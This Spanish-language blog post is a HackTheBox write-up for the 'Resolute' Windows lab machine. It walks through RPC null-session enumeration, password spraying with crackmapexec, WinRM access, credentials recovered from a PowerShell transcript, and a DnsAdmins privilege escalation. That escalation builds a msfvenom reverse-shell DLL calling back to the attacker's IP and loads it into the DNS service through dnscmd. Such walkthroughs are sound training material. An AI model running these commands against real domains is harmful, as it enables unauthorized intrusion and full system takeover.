---
layout: single
title: Writeup HTB - Maquina Resolute
comments: true
excerpt: "La maquina Resolute es una maquina windows - Medium, es muy interesante esta maquina empezamos enumerando RPC y obtenemos usuarios del dominio y para obtener mas informacion usamos querydispinfo y logramos encontrar credenciales en la descripcion del usuario marko. Sin  embargo no pudimos acceder con dicha password. Asi que usamos un ataque de password spray y accedemos con esa password con el usuario melanie. Asi pues accedemos con el usuario melanie por winrm y enumeramos con ls -force la carpeta PSTranscripts y encontramos un credenciales del usuario ryan en un archivo. Logramos acceder con por winrm con el usuario ryan y escalamos privilegios ya que dicho usuario pertenece a  DnsAdmins pudiendo aprovechar una vulnerabilidad y escalar como nt authority System."
date: 2022-02-05
classes: wide
header:
  teaser: /assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - OSCP  
  - Hacking
  - Active Directory
  - Medium
---


# HTB - Resolute
<p align="center">
<img src="/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled.png">
</p>

## Resumen
<div style="text-align: justify">
La maquina Resolute es una maquina windows - Medium, es muy interesante esta maquina empezamos enumerando RPC y obtenemos usuarios del dominio y para obtener mas informacion usamos querydispinfo y logramos encontrar credenciales en la descripcion del usuario marko. Sin  embargo no pudimos acceder con dicha password. Asi que usamos un ataque de password spray y accedemos con esa password con el usuario melanie. Asi pues accedemos con el usuario melanie por winrm y enumeramos con ls -force la carpeta PSTranscripts y encontramos un credenciales del usuario ryan en un archivo. Logramos acceder con por winrm con el usuario ryan y escalamos privilegios ya que dicho usuario pertenece a  DnsAdmins pudiendo aprovechar una vulnerabilidad y escalar como nt authority System.
</div>

## Scan Nmap

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%201.png)

## RPC

enumeramos primero entrando con sesion nula por RPC

```bash
rpcclient -U "" 10.129.96.155 -N
```

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%202.png)

accedemos y enumeramos usuarios 

```bash
rpcclient $> enumdomusers
```

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%203.png)

tambien podemos obtener mas informacion de un usuario por rid

```bash
rpcclient $> queryuser 0x1f4
```

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%204.png)

tambien usaremos el querydispinfo para obtener informacion de todo los usuarios y encontramos un usuario marko con una descripcion interesante ya que expone en su descripcion la credencial Welcome123!

```bash
rpcclient $> querydispinfo
```

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%205.png)

vemos una informacion mas detallada de este usuario

```bash
rpcclient $> queryuser 0x457
```

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%206.png)

intente conectarme por smb y winrm pero sin exito

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%207.png)

## Password Spray

entonces tome todo los usuarios y guarde en un archivo para poder realizar password spray

```bash
❯ rpcclient -U '' 10.129.96.155 -N -c "enumdomusers" | grep -oP "\[[a-zA-z]+\]" | tr -d "[]" > users.txt
```

y comenzamos el ataque y obtuvimos acceso de un usuario con estas credenciales

```bash
crackmapexec smb 10.129.96.155 -u users.txt -p Welcome123!
```

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%208.png)

probamos con winrm y nos sale pwned por lo tanto usaremos evilwinrm

```bash
crackmapexec winrm 10.129.96.155 -u melanie -p Welcome123!
```

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%209.png)

## Acceso Winrm

listo con las pruebas anteriores pudimos saber que podremos conectarnos con win-rm, asi que usamos evil-winrm para esta tarea

```bash
Resolute ❯ evil-winrm -i 10.129.96.155 -u melanie -p Welcome123!
```

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%2010.png)

accedemos sin problemas, asi podriamos aprovechar para leer la flag de user.txt

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%2011.png)

aqui se complico la cosa pues no encontraba forma de poder seguir, sin embargo probamos listar con ls y el argumento -force y encontramos directorios interesantes entre ellos PSTranscripts

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%2012.png)

entramos a dicha carpeta y seguimos listando y encontramos un archivo interesante

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%2013.png)

vemos el contenido de dicho archivo y encontramos credenciales

```bash
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
```

credenciales encontradas:

```bash
ryan:Serv3r4Admin4cc123!
```

probamos dichas credenciales  credenciales con crackmapexec

```bash
Resolute > crackmapexec winrm 10.129.96.155 -u ryan -p Serv3rAdmin4cc123!
Resolute > crackmapexec smb 10.129.96.155 -u ryan -p Serv3rAdmin4cc123!
```

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%2014.png)

## Acceso winrm - User ryan

accedemos con el usuario ryan sin problemas con evil-wimrm

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%2015.png)

enumeramos a que grupos pertenece este usuario  vemos que pertenece a DnsAdmins

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%2016.png)

buscando en internet encontramos un articulo donde vemos que podemos escalar de DnsAdmins to DomainAdmin

[Windows Privilege Escalation: DnsAdmins to DomainAdmin - Hacking Articles](https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/)

asi que seguimos los pasos y generamos nuestra dll maliciosa con msfvenom

```bash
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.104 LPORT=443 -f dll -o rev.dll
```

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%2017.png)

creamos un servidor smb con python impacket

```bash
❯ impacket-smbserver shared . -smb2support
```

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%2018.png)

dejamos con netcat el puerto 443 en escucha y  ejecutamos estos comandos en la maquina victima 

```bash
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.104\shared\rev.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe \\Resolute stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe \\Resolute start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3316
        FLAGS              :
```

y logramos obtener una reverse shell con permisos nt authority\System

![Untitled](/assets/images/2022-02-05-writeup-maquina-htb-resolute/Untitled%2019.png)

gracias por leer el writeup y espero que te haya gustado, nos vemos.